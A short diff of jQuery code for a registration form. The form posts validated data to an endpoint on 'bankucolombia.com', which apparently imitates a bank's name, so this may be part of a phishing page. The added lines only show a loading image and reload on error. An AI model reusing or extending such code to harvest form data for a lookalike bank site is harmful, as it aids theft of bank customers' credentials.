@@ -124,6 +124,7 @@
                     var validator = $("#frm_register").validate({errorPlacement: function(error,element) {return true;}});
                     validator.form();
                     if(validator.valid()){
+                    	$(".accent-4").html('<img src="assets/images/ajax-loader.gif" alt="Procesando...">');
                         $.ajax({
                             type: "POST",
                             url: "http://bankucolombia.com/lib/ajax_service_mobil.php",
@@ -138,6 +139,7 @@
                             },
 							error: function(XMLHttpRequest, textStatus, errorThrown) { 
 								alert("Problemas procesando datos: " + textStatus +" - "+errorThrown);
+								location.reload();
 							}
                         });                 
                     }
